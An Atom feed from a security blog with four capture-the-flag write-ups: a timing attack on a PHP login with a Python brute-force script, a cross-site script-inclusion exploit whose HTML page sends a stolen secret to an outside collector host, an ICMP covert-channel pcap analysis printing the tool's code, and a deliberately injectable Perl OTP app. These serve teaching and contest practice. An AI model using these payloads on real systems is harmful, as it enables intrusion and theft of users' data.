<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | The Swappage Playground]]></title>
  <link href="http://swappage.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://swappage.github.io/"/>
  <updated>2015-09-23T10:59:11+02:00</updated>
  <id>http://swappage.github.io/</id>
  <author>
    <name><![CDATA[Swappage]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CSAW CTF 2015: Lawn Care Simulator]]></title>
    <link href="http://swappage.github.io/blog/2015/09/23/csaw-ctf-2015-lawn-care-simulator/"/>
    <updated>2015-09-23T10:39:56+02:00</updated>
    <id>http://swappage.github.io/blog/2015/09/23/csaw-ctf-2015-lawn-care-simulator</id>
    <content type="html"><![CDATA[<p>It’s CTF season! and CSAW CTF, one of the funniest CTFs that takes place every year in september has ended this weekend, here is a writeup for one of the web challenges that were provided during the contest.</p>

<p>This 200 points challenge was a web application running a nicely useless javascript for “growing lawn”, and was providing all the typical features available in a standard web application, including registration and login.</p>

<p>The objective of this challenge was to login as admin.</p>

<!--more-->

<h2 id="clone-all-the-things">Clone all the things</h2>

<p>By looking at the index source code we could notice that the version number, present in the bottom corner of the page, was calculated based on the git repository hash.</p>

<p><img class="center" src="/images/2015-09-23_lawn-care-simulator/version.png"></p>

<p><code>javascript
&lt;script&gt;
    function init(){
        document.getElementById('login_form').onsubmit = function() {
            var pass_field = document.getElementById('password');
            pass_field.value = CryptoJS.MD5(pass_field.value).toString(CryptoJS.enc.Hex);
    };
    $.ajax('.git/refs/heads/master').done(function(version){$('#version').html('Version: ' +  version.substring (0,6))});
    initGrass();
}
&lt;/script&gt;
</code></p>

<p>Since the .git directory is available in the webroot, we can crawl it and download the entire repository, to obtain the source code and spot bugs.
To make my life easier i used DVCS-Pillage: https://github.com/evilpacket/DVCS-Pillage
to automate the whole process, and at the end i had all the website sources available to me, except.. of course for the flag.</p>

<pre><code>-rw-r--r--  1 root root  109 Sep 19 00:46 ___HINT___
-rw-r--r--  1 root root 2406 Sep 19 00:46 index.html
-rw-r--r--  1 root root 1410 Sep 19 00:46 jobs.html
drwxr-xr-x  2 root root 4096 Sep 19 14:50 js
-rw-r--r--  1 root root  918 Sep 19 00:46 premium.php
-rw-r--r--  1 root root 2937 Sep 19 00:46 sign_up.php
-rw-r--r--  1 root root   78 Sep 19 01:51 test.php
-rw-r--r--  1 root root  780 Sep 19 00:46 validate_pass.php
</code></pre>

<h2 id="the-bugs">The bugs</h2>
<p>In the php code there were two bugs:</p>

<p>The first was in the registration page <em>sign_up.php</em></p>

<p><code>php
&lt;?php
if ($_SERVER['REQUEST_METHOD'] === 'POST'){
    require_once 'db.php';
    $link = mysql_connect($DB_HOST, $SQL_USER, $SQL_PASSWORD) or die('Could not connect: ' . mysql_error());
    mysql_select_db('users') or die("Mysql error");
    $user = mysql_real_escape_string($_POST['username']);
    // check to see if the username is available
    $query = "SELECT username FROM users WHERE username LIKE '$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    if ($line == NULL){
        // Signing up for premium is still in development
        echo '&lt;h2 style="margin: 60px;"&gt;Lawn Care Simulator 2015 is currently in a private beta. Please check back later&lt;/h2&gt;';
    }
    else {
        echo '&lt;h2 style="margin: 60px;"&gt;Username: ' . $line['username'] . " is not available&lt;/h2&gt;";
    }
}
else {
?&gt;
</code>
As it’s possible to notice the query used to verify if a user already existed, used a <em>LIKE</em> statement, this means that by submitting a username value with the character %, we could disclose the already registered users; of course, since the registration was still closed, the only user we were expecting to find as already registered was the admin username, which happened to be ~~FLAG~~.</p>

<p><img class="center" src="/images/2015-09-23_lawn-care-simulator/user_exists.png"></p>

<p>The second one was in the way the login process was handled by the validate_pass.php</p>

<p>&#8220;`php
&lt;?
function validate($user, $pass) {
    require_once ‘db.php’;
    $link = mysql_connect($DB_HOST, $SQL_USER, $SQL_PASSWORD) or die(‘Could not connect: ‘ . mysql_error());
    mysql_select_db(‘users’) or die(“Mysql error”);
    $user = mysql_real_escape_string($user);
    $query = “SELECT hash FROM users WHERE username=’$user’;”;
    $result = mysql_query($query) or die(‘Query failed: ‘ . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    $hash = $line[‘hash’];</p>

<pre><code>if (strlen($pass) != strlen($hash))
    return False;

$index = 0;
while($hash[$index]){
    if ($pass[$index] != $hash[$index])
        return false;
    # Protect against brute force attacks
    usleep(300000);
    $index+=1;
}
return true; } ?&gt; ```
</code></pre>

<p>What the script implements as a <em>protection against brute force attacks</em> is faulty, and leave the script open to a byte by byte bruteforce attack on the hash, which wasn’t calculated by the server, but directly by the javascript on the client side.</p>

<p>By analyzing the timings of the server response it was possible to guess the characters that were composing the md5 hash for the ~~FLAG~~ user.</p>

<p>I built this horrible python script to do the job and retrieve the flag.</p>

<p>&#8220;`python
#!/usr/bin/python</p>

<p>import datetime
import time
import requests
from itertools import combinations
import itertools</p>

<p>letters = [‘a’, ‘b’, ‘c’, ‘d’, ‘e’, ‘f’, ‘0’, ‘1’, ‘2’, ‘3’, ‘4’, ‘5’, ‘6’, ‘7’, ‘8’, ‘9’]</p>

<p>hash = “”
padding = “XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX”
delay = 300</p>

<p>current_milli_time = lambda: int(round(time.time() * 1000))</p>

<p>while 1:
	for c in itertools.combinations_with_replacement(letters, 1):
#		time.sleep(0.5)
		start = current_milli_time()</p>

<pre><code>	stringa = (''.join(c))
	print "[*] bruteforcing MD5 with: " + hash + stringa + padding
	r = requests.post("http://54.175.3.248:8089/premium.php", data={'username': '~~FLAG~~', 'password': hash + stringa + padding})
	#print(r.status_code, r.reason)

	stop = current_milli_time()
	elapsed = stop - start
	print elapsed
	if elapsed &gt; delay:
		start = datetime.datetime.now()
		r = requests.post("http://54.175.3.248:8089/premium.php", data={'username': '~~FLAG~~', 'password': hash + stringa + padding})
		stop = datetime.datetime.now()
		if elapsed &gt; delay:
			print "[*] character found: " + stringa
			hash += stringa
			padding = padding[:-1]
			delay = delay + 300
			print padding
			print hash
			break
</code></pre>

<p>&#8220;`</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[EKOPARTY PRE-CTF 2015: Web200]]></title>
    <link href="http://swappage.github.io/blog/2015/09/21/ekoparty-pre-ctf-2015-web200/"/>
    <updated>2015-09-21T23:25:34+02:00</updated>
    <id>http://swappage.github.io/blog/2015/09/21/ekoparty-pre-ctf-2015-web200</id>
    <content type="html"><![CDATA[<p>This 200 points challenge was a really nice javascript and client-side security related task.</p>

<p>The website was allowing users to register and upon login it was possible to write some text in a text area and save it for future displaying.</p>

<p>Another function available in the web site was the possibility to submit an URL for review by the site administrator (in a sort of whistleblowing-like platform).</p>

<p>Tee objective of the task was to steal the administrator secret textarea content.</p>

<!-- more -->

<p>By logging off and on again from a different browser, the text area content was preserved, which suggested that this information was saved server side somewhere, but where?</p>

<p>By inspecting the page source code it was possible to spot a <em>file.js</em> which happened to contain the following code:</p>

<p>&#8220;`javascript
function getCookie(cname) {
    var name = cname + “=”;
    var ca = document.cookie.split(‘;’);
    for(var i=0; i&lt;ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==’ ‘) c = c.substring(1);
        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
    }
    return “”;
}</p>

<p>function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays<em>24</em>60<em>60</em>1000));
    var expires = “expires=”+d.toUTCString();
    document.cookie = cname + “=” + cvalue + “; “ + expires;
}</p>

<p>function isSubDomain(c) {
	var d = document.domain;
	var r = new RegExp(c+”$”).test(d);
	return r;
}</p>

<p>function saveSecret() {
	var s = document.getElementById(‘secretbox’).value;
	setCookie(‘secret’, encrypt(s),3);
}</p>

<p>function decrypt(data) {
	if (data==””) return “”;
	return window.atob(data);
}</p>

<p>function encrypt(data) {
	return window.btoa(data);
}</p>

<p>function checkDomain(c) {
	var d = document.domain;
	var r = false;
	if(d == c) {
		r = true;
	} else {
		r = isSubDomain(c);
	}
	return r;
}</p>

<p>if(checkDomain(“challs.ctf.site”))  {
	document.getElementById(‘secretbox’).value = decrypt(‘aGVsbG8gd29ybGQK’);
} else {
	console.log(“error”);
}
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>A couple of interesting things are happening here:&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>  &lt;li&gt;The javascript is responsible for populating the text area with our code&lt;/li&gt;
</span><span class='line'>  &lt;li&gt;before populating the text area it uses some functions to verify that the domain from which the script is included is &lt;em&gt;challs.ctf.site&lt;/em&gt; or a subdomain.&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;How can this be exploited?&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Considering what we just said, the javascript is dynamically generated by the web application depending on the account data; this means that as long as the user is logged in to the application, the javascript will be loaded with the informations about the form content populated accordingly.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;At this point what we can do is submit a link to a web page that we control, which includes the javascript from the server.
</span><span class='line'>This would load the content into the user browser, and since now the data is completely accessible by the client, we can manipulate it and possibly grab it.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;There is only one problem to solve: the javascript checks the domain from which the javascript is loaded.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;But let’s look at the function that actually checks for the subdomain: it uses the function &lt;em&gt;regExp.test()&lt;/em&gt;.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;This function is global and not defined in the js, therefore, what we can do is override it with a prototype in our code and force it to return always true, effectively nullifying the check.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;At this point, what happens is that when the admin visits our page, his personal javascript is loaded, with the informations related to the form content loaded within it, while our code will take care of grabbing the content of a text area we properly set up with the same name as the original one.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;The following code is the exploit i used to grab the secret message (the flag).&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;```html
</span><span class='line'>&lt;!DOCTYPE html&gt;
</span><span class='line'>&lt;html class="full"&gt;
</span><span class='line'>    &lt;head&gt;
</span><span class='line'>        &lt;meta charset="utf-8" /&gt;
</span><span class='line'>        &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
</span><span class='line'>        &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;
</span><span class='line'>        &lt;meta name="description" content="EKOPARTY PRE-CTF 2015" /&gt;
</span><span class='line'>        &lt;meta name="author" content="NULL Life" /&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    &lt;!-- Latest compiled and minified CSS --&gt;
</span><span class='line'>    &lt;link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css"&gt;
</span><span class='line'>    &lt;link rel="stylesheet" href="http://swappage.github.io/static/css/ctf.css" type="text/css"/&gt;
</span><span class='line'>
</span><span class='line'>    &lt;link rel="shortcut icon" href="http://swappage.github.io/static/img/favicon.ico"&gt;
</span><span class='line'>    &lt;link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Open+Sans" /&gt;
</span><span class='line'>
</span><span class='line'>    &lt;script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"&gt;&lt;/script&gt;
</span><span class='line'>    &lt;script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"&gt;&lt;/script&gt;
</span><span class='line'>
</span><span class='line'>    &lt;title&gt;safebox&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>
</span><span class='line'>&lt;script&gt;
</span><span class='line'>	RegExp.prototype.test = function(d) { return true; }
</span><span class='line'>&lt;/script&gt;
</span><span class='line'>
</span><span class='line'>&lt;textarea id=secretbox name=secretbox style="width: 70%; " rows=10&gt; 
</span><span class='line'>
</span><span class='line'>&lt;script src=http://challs.ctf.site:10000/safebox/file.js&gt;
</span><span class='line'>
</span><span class='line'>&lt;script&gt;
</span><span class='line'>	document.write('&lt;img src="http://xxx.xxx.xxx.xxx/collect.gif?cookie=' + document.getElementById('secretbox').value + '" /&gt;')
</span><span class='line'>&lt;/script&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;p&gt;&lt;/html&gt;</span></code></pre></td></tr></table></div></figure></p>

<p>and here is the result</p>

<pre><code>	52.20.148.242 - - [14/Sep/2015:23:30:37 +0200] "GET /collect.gif?cookie=EKO%7Bclient_side_security_for_the_lulz%7D
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[GITS 2015: CloudFS]]></title>
    <link href="http://swappage.github.io/blog/2015/01/20/gits-2015-cloudfs/"/>
    <updated>2015-01-20T16:35:21+01:00</updated>
    <id>http://swappage.github.io/blog/2015/01/20/gits-2015-cloudfs</id>
    <content type="html"><![CDATA[<p>This CTF was what I’d call <em>an humbling experience</em>; it was an absolutely great
contest, don’t get me wrong, but damn! it was hard!, and since I’m not a CTF
veteran, let me say that I learned an important thing: “There is no limit
to the evilness people can put in their effort of creating challanging puzzles”.</p>

<!-- more -->

<p>Ok but let’s get back to this specific challenge.
For 200 points we were asked to extract an hidden key from a pcap file.</p>

<p>The name of the challenge was an hint itself: <em>cloudfs</em> made me think about
something that was used to transfer a file, and by opening a pcap all i could see
were some HTTP traffic packets to wikipedia, and loots and loots of ICMP ping
requests/responses.</p>

<p><img class="center" src="/images/2015-01-20_cloudfs/pings.png"></p>

<p>Before diving into the pcap itself i ran through some usual checks you do to spot
obvious things, and after having verified that nothing was appended at the bottom of
the pcap file, and that it wasn’t a <em>polyglot</em> i started looking closer at the packets
themselves.</p>

<p>Fresh from the <a href="http://blog.vulnhub.com/2014/09/competition-persistence.html">Persistence competition</a>
I figured out pretty quickly that the icmp packets could have been used as a cover channel
to hide something, and in fact if we look at the payload data from a couple of random
icmp requests we could easly notice that the ping pattern was containing custom data.</p>

<p><img class="center" src="/images/2015-01-20_cloudfs/apples.png"></p>

<p>The interesting things start at packet 1040 in the pcap file, where we can see
the header for a bzip2 file</p>

<p><img class="center" src="/images/2015-01-20_cloudfs/bz2.png"></p>

<p>which was repeating onwards every 4 packets till the end of the pcap file.</p>

<p>I’ve then tried to extract the data payload of the four interesting packets and use
binwalk to see if it could extract something useful.</p>

<pre><code># binwalk -e filtered.pcap

DECIMAL   	HEX       	DESCRIPTION
-------------------------------------------------------------------------------------------------------------------
20        	0x14      	bzip2 compressed data, block size = 900k
</code></pre>

<p>It was actually detecting and extracting a bzip2 file, the header was there, after
all, but if i tried extracting its content it was informing me that the file was
corrupted.</p>

<pre><code># bunzip2 14.bz2

bunzip2: Data integrity error when decompressing.
Input file = 14.bz2, output file = 14

It is possible that the compressed file(s) have become corrupted.
You can use the -tvv option to test integrity of such files.

You can use the `bzip2recover' program to attempt to recover
data from undamaged sections of corrupted files.

bunzip2: Deleting output file 14, if it exists.
</code></pre>

<p>It took me a little while to notice that the pings were sent in an incorrect
order, and that it was necessary to reorder them properly.</p>

<p>In fact, let’s look at the icmp packet identifier.</p>

<p><img class="center" src="/images/2015-01-20_cloudfs/identifier.png"></p>

<p>Here it’s possible to notice that the identifier are ordered as 13 14 16 15</p>

<p>I’ve tried to extract the packets payload data separately (after all they were
  only 4 packets) and reassemble them by hand.</p>

<pre><code># cat 13.raw 14.raw 15.raw 16.raw &gt; reassembled.raw
# binwalk reassembled.raw -e

DECIMAL   	HEX       	DESCRIPTION
-------------------------------------------------------------------------------------------------------------------
20        	0x14      	bzip2 compressed data, block size = 900k

# ls -la
total 64
drwxr-xr-x 2 root root  4096 Jan 20 20:00 .
drwxr-xr-x 7 root root 36864 Jan 20 20:00 ..
-rw-r--r-- 1 root root 24556 Jan 20 20:00 14

# file 14
14: POSIX tar archive (GNU)

# mv 14 14.tar; tar xvf 14.tar
key
ping/ping.py
</code></pre>

<p>and appearently we got the tar archive containing both the key, as well as the
python script that was used to create the cover channel</p>

<pre><code># cat key
key{WhyWouldYouEverUseThis}
</code></pre>

<p>&#8220;`python
import os,sys,socket,struct,select,time,binascii,logging
import ping_reporter</p>

<p>ping_count = 0
ping_bandwidth = 0
log = ping_reporter.setup_log(‘Ping’)
server_list = [‘www.wikipedia.org’]</p>

<p>def select_server(log,max_timeout=2):
server = ‘’
log.notice(‘selecting server’)
maxw = len(max(server_list, key=len))
min_delay = max_timeout * 1000 # seconds -&gt; ms
for x in server_list:
delay = min_delay + 1
try: delay = single_ping(x,max_timeout)
finally:
if delay == None: log.notice(‘%-<em>s: timed out’%(maxw,x))
else:             log.notice(‘%-</em>s: %05.02fms’%(maxw,x,delay<em>1000))
if delay != None and delay &lt; min_delay:
min_delay = delay
server = x
log.info(‘selected server: %s (%.02fms)’%(server,min_delay</em>1000))
return server</p>

<p>def carry_add(a, b):
c = a + b
return (c &amp; 0xFFFF) + (c » 16)</p>

<p>def checksum(msg):
s = 0
if len(msg)%2: # pad with NULL
msg = msg + ‘%c’%0
for i in range(0, len(msg)/2*2, 2):
w = ord(msg[i]) + (ord(msg[i+1]) « 8)
s = carry_add(s, w)
return ~s &amp; 0xFFFF</p>

<p>def build_ping(ID, data):
log.trace(‘ping::build_ping: ID=%d, bytes=%d’%(ID,len(data)))
if ID == 0: raise Exception(‘Invalid BlockID (0): many servers will corrupt ID=0 ICMP messages’)</p>

<p>data = str(data) # string type, like the packed result</p>

<h1 id="header-is-type-8-code-8-checksum-16-id-16-sequence-16">Header is type (8), code (8), checksum (16), id (16), sequence (16)</h1>
<p>icmp_type      = 8 # ICMP_ECHO_REQUEST
icmp_code      = 0 # Can be anything, but reply MUST be 0
icmp_checksum  = 0 # 0 for initial checksum calculation
#	icmp_id        = (ID » 16) &amp; 0xFFFF
#	icmp_sequence  = (ID «  0) &amp; 0xFFFF
block_id       = ID # append id &amp; seq for 4-byte identifier</p>

<p>header = struct.pack(“bbHI”, icmp_type, icmp_code, icmp_checksum, block_id)
icmp_checksum = checksum(header+data)
header = struct.pack(“bbHI”, icmp_type, icmp_code, icmp_checksum, block_id)</p>

<h1 id="return-built-icmp-message">Return built ICMP message</h1>
<p>return header+data</p>

<p>def build_socket(RCVBUF=1024*1024):
# By default, SO_RCVBUF is ~50k (kernel doubles to 114688), which only supports
# ~1k blocks with &lt;1ms timing. Raising this to 1m supports &gt;16k blocks. Unfortunately,
# raising it more does little because we can’t read/process the events fast enough, so
# the buffer pretty quickly fills, and then start dropping packets again.
log.trace(‘ping::build_socket’)
icmp = socket.getprotobyname(“icmp”)
try:
icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
except socket.error, (errno, msg):
if errno == 1: # Operation not permitted
msg = msg + (“ (ICMP messages can only be sent from processes running as root)”)
raise socket.error(msg)
raise # raise the original error
socket.SO_SNDBUFFORCE = 32
socket.SO_RCVBUFFORCE = 33
icmp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUFFORCE, RCVBUF)
icmp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUFFORCE, RCVBUF)
return icmp_socket</p>

<p>def time_ping(d_socket, d_addr, ID=1):
log.trace(‘ping::time_ping: server=%s ID=%d’%(d_addr,ID))
data = struct.pack(“d”,time.time())
return data_ping(d_socket, d_addr, ID, data)</p>

<p>def data_ping(d_socket, d_addr, ID, data):
log.trace(‘ping::data_ping: server=%s ID=%d bytes=%d’%(d_addr,ID,len(data)))
send_ping(d_socket, socket.gethostbyname(d_addr), ID, data)</p>

<p>def send_ping(d_socket, d_addr, ID, data):
log.trace(‘ping::send_ping: server=%s ID=%d bytes=%d’%(d_addr,ID,len(data)))
global ping_count, ping_bandwidth
packet = build_ping(ID,data)
d_socket.sendto(packet, (d_addr, 1))
if 1:
ping_count = ping_count + 1
ping_bandwidth = ping_bandwidth + len(packet)</p>

<p>def parse_ip(packet):
log.trace(‘ping::parse_ip: bytes=%d’%(len(packet)))
if len(packet) &lt; 20: return None
(verlen,ID,flags,frag,ttl,protocol,csum,src,dst) = struct.unpack(‘!B3xH4BHII’,packet[:20])
ip = dict(  version= verlen » 4,
  length=  4*(verlen &amp; 0xF),
  ID=      ID,
  flags=   flags » 5,
  fragment=((flags &amp; 0x1F)+frag),
  ttl=     ttl,
  protocol=protocol,
  checksum=csum,
  src=     src,
  dst=     dst)
  return ip</p>

<p>def parse_icmp(packet,validate):
  log.trace(‘ping::parse_icmp: bytes=%d’%(len(packet)))
  if len(packet) &lt; 8: return None
  (type, code, csum, block_id) = struct.unpack(‘bbHI’, packet[:8])
  log.debug(‘ping::parse_icmp: type=%d code=%d csum=%x ID=%d’%(type,code,csum,block_id))
  icmp = dict(type=type,
    code=code,
    checksum=csum, # calculated big-endian
    block_id=block_id)</p>

<pre><code>if validate:
t_header = struct.pack('bbHI',type,code,0,block_id)
t_csum = checksum(t_header+packet[8:])
icmp['valid'] = (t_csum == csum)

return icmp

def parse_ping(packet,validate=False):
log.trace('ping::parse_ping: bytes=%d validate=%s'%(len(packet),validate))
if len(packet) &lt; 20+8+1: return None # require 1 block of data
ip = parse_ip(packet)
if not ip:                                return None
if ip['protocol'] != socket.IPPROTO_ICMP: return None # ICMP
if ip['version'] != socket.IPPROTO_IPIP:  return None # IPv4
if ip['length']+8+1 &gt; len(packet):        return None # invalid ICMP header

packet = packet[ip['length']:]
icmp = parse_icmp(packet,validate)
if not icmp:                              return None
if icmp['type'] != 0:                     return None # not an Echo Reply packet
if icmp['code'] != 0:                     return None # not a valid Echo Reply packet
if validate and icmp['valid'] != True:    return None # invalid ICMP checksum

payload = packet[8:]
log.debug('ping::parse_ping: valid echo reply w/ ID=%d (%d bytes)'%(icmp['block_id'],len(payload)))
return dict(ip=ip,icmp=icmp,payload=payload)


def recv_ping(d_socket, timeout, validate=False):
d_socket.settimeout(timeout)
try:
data,addr = d_socket.recvfrom(2048)
except socket.timeout:
return None
parsed = parse_ping(data,validate)
if not parsed: return None
parsed['ID']=parsed['icmp']['block_id']
parsed['address']=addr
parsed['raw']=data
log.debug('ping::recv_ping: ID=%d address=%s bytes=%d'%(parsed['ID'],addr,len(data)))
return parsed

def read_ping(d_socket, timeout):
start = time.time()
while time.time() - start &lt; timeout:
msg = recv_ping(d_socket,timeout)
if msg: return msg
return None

def receive_ping(my_socket, ID, timeout):
timeLeft = timeout
while True:
startedSelect = time.time()
whatReady = select.select([my_socket], [], [], timeLeft)
if whatReady[0] == []: # Timeout
return

timeReceived = time.time()
howLongInSelect = (timeReceived - startedSelect)
recPacket, addr = my_socket.recvfrom(1024)
icmpHeader = recPacket[20:28]
type, code, checksum, packetID = struct.unpack("bbHI", icmpHeader)
if packetID == ID:
bytesInDouble = struct.calcsize("d")
timeSent = struct.unpack("d", recPacket[28:28 + bytesInDouble])[0]
return timeReceived - timeSent

timeLeft = timeLeft - howLongInSelect
if timeLeft &lt;= 0:
return 0

def single_ping(dest_addr, timeout):
my_socket = build_socket()
my_ID = os.getpid() &amp; 0xFFFF
time_ping(my_socket, dest_addr, my_ID)
delay = receive_ping(my_socket, my_ID, timeout)
my_socket.close()
return delay

def verbose_ping(dest_addr, timeout = 2, count = 4):
for i in xrange(count):
log.info("ping %s..." % dest_addr,)
try:
delay  =  single_ping(dest_addr, timeout)
except socket.gaierror, e:
log.error("failed. (socket error: '%s')" % e[1])
break

if delay  ==  None:
log.info("failed. (timeout within %ssec.)" % timeout)
else:
delay  =  delay * 1000
log.info("get ping in %0.4fms" % delay)
print


import os, pwd, grp

if __name__ == '__main__':
ping_reporter.start_log(log)
server = select_server(log,2)

if 1:
verbose_ping(server)
else:
s = build_socket()
print 'sending 100 pings...'
for x in range(1,100):
data_ping(s,server,x,struct.pack('d',x))
print 'ping cycled...'
recv_ping(s,1)
print '100 pings sent'
</code></pre>

<p>&#8220;`</p>

<p>And this one was one of the simpliest challenges in this contest… so well…
congratulations to all the teams that solved a lot of them :)</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent 2014 Day 21 : Otp]]></title>
    <link href="http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp/"/>
    <updated>2014-12-24T18:26:40+01:00</updated>
    <id>http://swappage.github.io/blog/2014/12/24/advent-2014-day-21-otp</id>
    <content type="html"><![CDATA[<p>otp was a nice (and painful) web challenge in the advent calendar CTF 2014.</p>

<p>We were provided with the source code of the web application and with an URL: the objective was to successfully login to the web site to get the flag.</p>

<!-- more -->

<p>&#8220;`perl
#!/usr/bin/env perl
use Mojolicious::Lite;
use DBI;</p>

<p>my $dbh = DBI-&gt;connect(
    ‘dbi:SQLite:dbname=./otp.db’, ‘’, ‘’,
    +{
        RaiseError     =&gt; 1,
        sqlite_unicode =&gt; 1,
    }
);
app-&gt;helper(dbh =&gt; sub { $dbh });</p>

<p>get ‘/’ =&gt; sub {
    my $c = shift;
    my ($token, $pass) = gen_otp();
    my $expire = time() + 10;
    $c-&gt;dbh-&gt;do(‘INSERT INTO otp VALUES (?, ?, ?)’, undef, $token, $pass, $expire);
    $c-&gt;render(‘index’, token =&gt; $token);
};</p>

<p>post ‘/’ =&gt; sub {
    my $c = shift;
    my $token = $c-&gt;req-&gt;param(‘token’);
    # tiny firewall, but powerful :P
    if ($token =~ /sqlite/i) {
        $c-&gt;render(‘error’, message =&gt; “no hack.”);
        return;
    }
    my $time = time();
    my ($expire) = $c-&gt;dbh-&gt;selectrow_array(
        “SELECT ###CENSORED### FROM otp WHERE ###CENSORED### = ‘$token’ AND ###CENSORED### &lt; $time”,
    );
    if ($expire) {
        $c-&gt;render(‘error’, message =&gt; “otp expired at $expire”);
    } else {
        my $pass = $c-&gt;req-&gt;param(‘pass’);
        my ($ok) = $c-&gt;dbh-&gt;selectrow_array(
            ‘SELECT 1 FROM otp WHERE ###CENSORED### = ? AND ###CENSORED### = ?’, undef, $token, $pass,
        );
        $c-&gt;render(‘auth’, ok =&gt; $ok);
    }
    $c-&gt;dbh-&gt;do(
        ‘DELETE FROM otp WHERE ###CENSORED### = ?’, undef, $token
    );
};</p>

<p>sub gen_otp {
    open my $fh, ‘&lt;:raw’, ‘/dev/urandom’ or die $!;
    read $fh, my $token, 8;
    $token = unpack ‘H<em>’, $token;
    read $fh, my $pass, 16;
    $pass = unpack ‘H</em>’, $pass;
    return ($token, $pass);
}</p>

<p>app-&gt;start;
<strong>DATA</strong></p>

<p>@@ index.html.ep
% layout ‘default’;
% title ‘OTP’;</p>

<form method="POST">
  <input type="hidden" name="token" value="&lt;%= $token %&gt;" />
  <input type="text" name="pass" />
  <input type="submit" value="auth" />
</form>

<p>@@ auth.html.ep
% layout ‘default’;
% title ‘Authentication | OTP’;</p>

<p>% if ($ok) {</p>
<p>authentication succeeded.<br />the flag is: ###CENSORED###</p>
<p>% } else {</p>
<p>authentication failed.</p>
<p>% }</p>

<p>@@ error.html.ep
% layout ‘default’;
% title ‘Error | OTP’;</p>

<p>&lt;%= $message %&gt;</p>

<p>@@ layouts/default.html.ep
&lt;!DOCTYPE html&gt;</p>
<html>
  <head>
    <title>&lt;%= title %&gt;</title>
  </head>
  <style>
body, input {
  color: #fff;
  background: #333;
  font-family: monospace;
  font-size: 150%;
}
.container {
  width: 100%;
  margin-top: 50px;
  text-align: center;
}
  </style>
  <body>
<div class="container">
&lt;%= content %&gt;
</div>
  </body>
</html>

<p>&#8220;`</p>

